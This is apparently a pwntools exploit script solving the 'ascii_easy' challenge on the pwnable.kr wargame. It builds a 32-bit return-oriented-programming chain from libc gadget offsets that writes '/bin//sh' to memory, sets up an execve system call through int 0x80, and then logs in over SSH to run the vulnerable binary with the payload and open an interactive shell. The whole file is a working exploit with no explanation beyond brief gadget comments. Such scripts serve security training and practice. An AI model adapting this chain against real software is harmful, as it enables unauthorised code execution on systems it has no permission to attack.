from pwn import *

BASE = 0x5555E000

# This where I stored data
storage = 0x55563022
# pop edx ; xor eax, eax ; pop edi ; ret
pop_edx_xor_eax_pop_edi = BASE + 0x00095555
# pop ecx ; add al, 0xa ; ret
pop_ecx = BASE + 0x00174a51
#  mov dword ptr [edx], ecx ; pop ebx ; ret
mov_edx_ecx_pop_ebx = BASE + 0x000d7738
# mov dword ptr [edx], eax ; ret
mov_edx_eax = BASE + 0x000a845c
# pop ecx ; add al, 0xa ; ret
pop_ecx = BASE + 0x00174a51
# pop ebx ; ret
pop_ebx = BASE + 0x0001934e
# inc eax ; ret 0
inc_eax = BASE + 0x00168864
# int 0x80
int_80 = BASE + 0x00109176
# nop ; xor eax, eax ; ret
xor_eax = BASE + 0x0007403f

p = b'HEHE'*8
p += pack(pop_edx_xor_eax_pop_edi, 32)
p += pack(storage, 32)
p += b'HEHE'
p += pack(pop_ecx, 32)
p += b'/bin'
p += pack(mov_edx_ecx_pop_ebx, 32)
p += b'HEHE'
p += pack(pop_edx_xor_eax_pop_edi, 32)
p += pack(storage + 4, 32)
p += b'HEHE'
p += pack(pop_ecx, 32)
p += b'//sh'
p += pack(mov_edx_ecx_pop_ebx, 32)
p += b'HEHE'
p += pack(pop_edx_xor_eax_pop_edi, 32)
p += pack(storage + 8, 32)
p += b'HEHE'
p += pack(mov_edx_eax, 32)
p += pack(pop_ecx, 32)
p += pack(storage + 8, 32)
p += pack(pop_ebx, 32)
p += pack(storage, 32)
p += pack(xor_eax, 32)
p += pack(inc_eax, 32)
p += pack(inc_eax, 32)
p += pack(inc_eax, 32)
p += pack(inc_eax, 32)
p += pack(inc_eax, 32)
p += pack(inc_eax, 32)
p += pack(inc_eax, 32)
p += pack(inc_eax, 32)
p += pack(inc_eax, 32)
p += pack(inc_eax, 32)
p += pack(inc_eax, 32)
p += pack(int_80, 32)

print(p.decode('ascii'))

shell = ssh('ascii_easy', 'pwnable.kr', 2222, 'guest')
proc = shell.process(['./ascii_easy', p.decode('ascii')])

proc.interactive()
